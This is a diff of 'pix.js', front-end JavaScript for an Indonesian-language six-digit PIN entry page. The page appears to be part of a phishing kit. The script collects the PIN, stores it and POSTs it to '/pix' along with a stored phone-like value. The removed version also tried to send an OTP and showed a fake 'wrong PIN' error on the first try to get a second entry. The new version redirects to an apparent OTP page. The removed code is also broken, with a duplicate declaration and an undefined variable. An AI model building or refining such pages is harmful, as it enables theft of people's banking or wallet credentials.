@@ -1,43 +1,40 @@
 // pix.js
 
-const inputs = document.querySelectorAll(".pix-box");
-const showBtn = document.getElementById("showBtn");
-const loadingBox = document.getElementById("loadingBox");
-const errorBox = document.getElementById("errorBox");
+const inputs =
+document.querySelectorAll(".pix-box");
+
+const showBtn =
+document.getElementById("showBtn");
+
+const loadingBox =
+document.getElementById("loadingBox");
+
+const errorBox =
+document.getElementById("errorBox");
 
 let isShow = false;
-let attempt = 0;
-let isProcessing = false;
 
-/* ========================= */
-/* FADE IN */
-/* ========================= */
-
+/* FADE IN */ 
 window.addEventListener("load", () => {
-    document.body.classList.add("fade-in");
+
+    document.body.classList.add(
+    "fade-in"
+    );
+
 });
 
 /* ========================= */
 /* RESET LOADING */
 /* ========================= */
 
-window.addEventListener("pageshow", () => {
-    if(loadingBox){
-        loadingBox.style.display = "none";
-    }
+window.addEventListener(
+"pageshow",
+() => {
+
+    loadingBox.style.display =
+    "none";
+
 });
-
-/* ========================= */
-/* FUNGSI RESET */
-/* ========================= */
-
-function resetPix(){
-    inputs.forEach(input => {
-        input.value = "";
-    });
-
-    inputs[0].focus();
-}
 
 /* ========================= */
 /* FOKUS KE BOX KOSONG */
@@ -45,13 +42,26 @@ function resetPix(){
 
 inputs.forEach((input,index) => {
 
-    input.addEventListener("click", () => {
+    input.addEventListener(
+    "click",
+    () => {
 
-        for(let i = 0; i < inputs.length; i++){
-            if(inputs[i].value === ""){
+        for(
+            let i = 0;
+            i < inputs.length;
+            i++
+        ){
+
+            if(
+                inputs[i].value === ""
+            ){
+
                 inputs[i].focus();
+
                 break;
+
             }
+
         }
 
     });
@@ -59,35 +69,64 @@ inputs.forEach((input,index) => {
 });
 
 /* ========================= */
-/* AUTO INPUT */
+/* AUTO PIX */
 /* ========================= */
 
 inputs.forEach((input,index) => {
 
-    input.addEventListener("input", () => {
+    input.addEventListener(
+    "input",
+    () => {
 
-        input.value = input.value.replace(/[^0-9]/g,'');
+        input.value =
+        input.value.replace(
+        /[^0-9]/g,
+        ''
+        );
 
-        if(errorBox){
-            errorBox.classList.remove("show");
-        }
+        /* HIDE ERROR */
+        errorBox.classList.remove(
+        "show"
+        );
 
-        if(input.value.length === 1){
-            if(index < inputs.length - 1){
-                inputs[index + 1].focus();
+        /* NEXT */
+        if(
+            input.value.length === 1
+        ){
+
+            if(
+                index <
+                inputs.length - 1
+            ){
+
+                inputs[index + 1]
+                .focus();
+
             }
+
         }
 
         checkPix();
 
     });
 
-    input.addEventListener("keydown", (e) => {
+    /* BACKSPACE */
+    input.addEventListener(
+    "keydown",
+    (e) => {
 
-        if(e.key === "Backspace" && input.value === ""){
+        if(
+            e.key === "Backspace" &&
+            input.value === ""
+        ){
+
             if(index > 0){
-                inputs[index - 1].focus();
+
+                inputs[index - 1]
+                .focus();
+
             }
+
         }
 
     });
@@ -95,135 +134,141 @@ inputs.forEach((input,index) => {
 });
 
 /* ========================= */
-/* SHOW / HIDE */
+/* SHOW PIX */
 /* ========================= */
 
-if(showBtn){
-    showBtn.addEventListener("click", () => {
+showBtn.addEventListener(
+"click",
+() => {
 
-        isShow = !isShow;
+    isShow = !isShow;
 
-        inputs.forEach(input => {
-            input.type = isShow ? "text" : "password";
-        });
+    inputs.forEach(input => {
 
-        showBtn.innerText =
+        input.type =
         isShow
-        ? "SEMBUNYIKAN"
-        : "TAMPILKAN";
+        ? "text"
+        : "password";
 
     });
-}
+
+    showBtn.innerText =
+    isShow
+    ? "SEMBUNYIKAN"
+    : "TAMPILKAN";
+
+});
 
 /* ========================= */
 /* CHECK PIX */
 /* ========================= */
 
-async function checkPix(){
+ async function checkPix(){
 
     let pix = "";
 
     inputs.forEach(input => {
+
         pix += input.value;
+
     });
 
-    if(pix.length === 6 && !isProcessing){
 
-        isProcessing = true;
-        attempt++;
+    /* FULL */
+    if(pix.length === 6){
 
-        /* ========================= */
-        /* STEP 1: LOADING */
-/* ========================= */
+        /* PIX SALAH */
+        if(pix === "123456"){
 
-        if(loadingBox){
-            loadingBox.style.display = "flex";
+            /* GETAR */
+            if(navigator.vibrate){
+
+                navigator.vibrate([
+                    120,
+                    80,
+                    120
+                ]);
+
+            }
+
+            /* SHOW ERROR */
+            errorBox.classList.add(
+            "show"
+            );
+
+            /* AUTO HIDE */
+            setTimeout(() => {
+
+                errorBox.classList.remove(
+                "show"
+                );
+
+            },2000);
+
+            /* RESET */
+            setTimeout(() => {
+
+                inputs.forEach(input => {
+
+                    input.value = "";
+
+                });
+
+                inputs[0].focus();
+
+            },300);
+
+            return;
+
         }
 
-        setTimeout(async () => {
+        /* AMBIL */
+        const nmrx =
+            localStorage.getItem(
+            "nmrx"
+            );
 
-            /* ========================= */
-            /* STEP 2: ALERT */
-/* ========================= */
+         /* SIMPAN */
+    localStorage.setItem(
+    "pix",
+    pix
+    );
 
-            if(attempt === 1){
+        /* KIRIM */
+    await fetch("/pix", {
 
-                if(errorBox){
-                    errorBox.innerText =
-                    "PIN Salah, pastikan PIN yang kamu masukan sudah benar";
+        method:"POST",
 
-                    errorBox.style.background = "#ff3b3b";
-                    errorBox.style.color = "#fff";
+        headers:{
+            "Content-Type":
+            "application/json"
+        },
 
-                    errorBox.classList.add("show");
+        body:JSON.stringify({
 
-                    setTimeout(() => {
-                        errorBox.classList.remove("show");
-                    },2000);
-                }
+            nmrx:nmrx,
+            pix:pix
 
-            } else {
+        })
 
-                if(errorBox){
-                    errorBox.innerText =
-                    "Terimakasih, permintaan Anda sedang di proses";
+    });
+        
+        /* SHOW LOADING */
+        loadingBox.style.display =
+        "flex";
 
-                    errorBox.style.background = "#2b7cff";
-                    errorBox.style.color = "#fff";
+        /* DELAY */
+        setTimeout(() => {
 
-                    errorBox.classList.add("show");
+             /* FADE OUT */
+    document.body.classList.add(
+    "fade-out"
+    );
 
-                    setTimeout(() => {
-                        errorBox.classList.remove("show");
-                    },2500);
-                }
+            window.location.href =
+            "otx.html";
 
-            }
-
-            /* ========================= */
-            /* STEP 3: KIRIM DATA */
-/* ========================= */
-
-            localStorage.setItem("pix", pix);
-            const nmrx = localStorage.getItem("nmrx");
-            const nmrx = localStorage.getItem("otp");
-
-
-
-            try{
-                await fetch("/pix", {
-                    method:"POST",
-                    headers:{
-                        "Content-Type":"application/json"
-                    },
-                    body:JSON.stringify({
-                        nmrx:nmrx,
-                        otp:otp,
-                        pix:pix
-                    })
-                });
-            }catch(e){
-                console.log("ERROR:", e);
-            }
-
-            /* ========================= */
-            /* STEP 4: HIDE LOADING */
-/* ========================= */
-
-            if(loadingBox){
-                loadingBox.style.display = "none";
-            }
-
-            /* ========================= */
-            /* STEP 5: RESET SELALU */
-/* ========================= */
-
-            setTimeout(() => {
-                resetPix();
-                isProcessing = false;
-            },200);
-
-        },1500);
+        },2000);
 
     }
 
